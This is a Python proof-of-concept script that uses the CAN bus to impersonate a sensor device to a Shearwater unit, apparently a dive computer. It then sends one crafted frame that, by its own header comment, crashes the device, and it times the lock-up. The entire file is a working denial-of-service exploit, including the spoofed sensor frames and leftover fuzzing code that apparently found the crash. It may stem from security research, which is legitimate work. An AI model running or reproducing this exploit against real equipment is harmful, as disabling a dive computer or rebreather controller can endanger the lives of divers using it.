# Causes a shearwater to crash

import can
import time, threading
import asyncio

can.rc['interface'] = 'socketcan'
can.rc['channel'] = 'can0'
can.rc['bitrate'] = 125000

busFailed = False

def txID(bus):
    msg = can.Message(
        arbitration_id=0xD000004,
        data=[0x00, 0x00, 0x00],
        is_extended_id=True
    )
    try:
        bus.send(msg)
        #print(f"Message sent on {bus.channel_info}")
    except can.CanError:
        #print("Message NOT sent")
        global busFailed
        busFailed = True

def txName(bus):
    name = "C-inator"
    byte_name = bytearray()
    byte_name.extend(map(ord, name))


    msg = can.Message(
        arbitration_id=0xD010004,
        data=byte_name,
        is_extended_id=True
    )
    try:
        bus.send(msg)
        #print(f"Message sent on {bus.channel_info}")
    except can.CanError:
        #print("Message NOT sent")
        global busFailed
        busFailed = True

def txStatus(bus):
    msg = can.Message(
        arbitration_id=0xDCB0004,
        data=[0x50, 0x00, 0x00, 0x00, 0x00, 0x46, 0x63, 0x00],
        is_extended_id=True
    )
    try:
        bus.send(msg)
        #print(f"Message sent on {bus.channel_info}")
    except can.CanError:
        #print("Message NOT sent")
        global busFailed
        busFailed = True

def txPPO2(bus):
    msg = can.Message(
        arbitration_id=0xD040004,
        data=[0x00, 0x20, 0x20, 0x20],
        is_extended_id=True
    )
    try:
        bus.send(msg)
        #print(f"Message sent on {bus.channel_info}")
    except can.CanError:
        #print("Message NOT sent")
        global busFailed
        busFailed = True

def txMillis(bus):
    msg = can.Message(
        arbitration_id=0xD110004,
        data=[0x04,0x70,0x04,0x38,0x04,0x6f,0x00],
        is_extended_id=True
    )
    try:
        bus.send(msg)
        #print(f"Message sent on {bus.channel_info}")
    except can.CanError:
        #print("Message NOT sent")
        global busFailed
        busFailed = True   

def txCellStat(bus):
    msg = can.Message(
        arbitration_id=0xDCA0004,
        data=[0b111, 0x46],
        is_extended_id=True
    )
    try:
        bus.send(msg)
        #print(f"Message sent on {bus.channel_info}")
    except can.CanError:
        #print("Message NOT sent")
        global busFailed
        busFailed = True

# The bare minimum to convince the shearwater that we're real
def ping(bus):
    txID(bus)
    txName(bus)
    txStatus(bus)
    txPPO2(bus)
    txMillis(bus)
    txCellStat(bus)

# Static store
INIT_ID = 0xd300000
MAX_ID = 0xdf00000
ID_INCR = 0x0010000
ID_SUFFIX = 0x104
CRASH_ID = 0xd320004

# Global state storage
swConnected = False
pinging = True
currId = INIT_ID
dataVal = 112
startTime = 0
printMsgs = False

def print_message(msg: can.Message) -> None:
    """Regular callback function. Can also be a coroutine."""
    if printMsgs:
        currTime = time.time()
        deltaT = currTime - startTime
        deltaTStr = "{:.5f}".format(deltaT)
        hex_string = "".join("%02x," % b for b in msg.data)
        print("t+"+deltaTStr+" | rx id: " + hex(msg.arbitration_id)+"; "+ hex_string)
    if msg.arbitration_id == 0xD000001:
        global swConnected
        swConnected = True


with can.ThreadSafeBus() as bus: 
    can.Notifier(bus, [print_message], loop=None)

    def pingTimer():
        ping(bus)
        #print("ping!")
        if(pinging):
            threading.Timer(1, pingTimer).start()

    pingTimer()

    while not swConnected:
        for msg in bus:
            print("Shearwater Connected")
            swConnected = True
            break
    
    i = 0


    input("=== Press Enter To Crash ===")
    print("Sending " + hex(CRASH_ID) + ": [112, 112, 112, 112, 112, 112, 112, 112]")
    #time.sleep(0.2)
    #tx_id = currId+ID_SUFFIX

    msg = can.Message(
        arbitration_id=CRASH_ID,
        data=[dataVal,dataVal,dataVal,dataVal,dataVal,dataVal,dataVal,dataVal],
        is_extended_id=True
    )   
    #print("[" + str(i) + "] trying ID: " + hex(tx_id) + "| val: " + str(dataVal))
    try:
        bus.send(msg)
        startTime = time.time()
        printMsgs = True
        #print(f"Message sent on {bus.channel_info}")
    except can.CanError:
        print("Message NOT sent")

    # i += 1
    # currId += ID_INCR
    # if currId > MAX_ID:
    #     currId = INIT_ID
    #     dataVal += 1
    
    swConnected = False
    timeElapsed = 0
    while not swConnected:
        timeElapsed += 1
        time.sleep(1)
        print("Time locked-up: " + str(timeElapsed))

    print("Shearwater back online")
    pinging = False
    time.sleep(2)



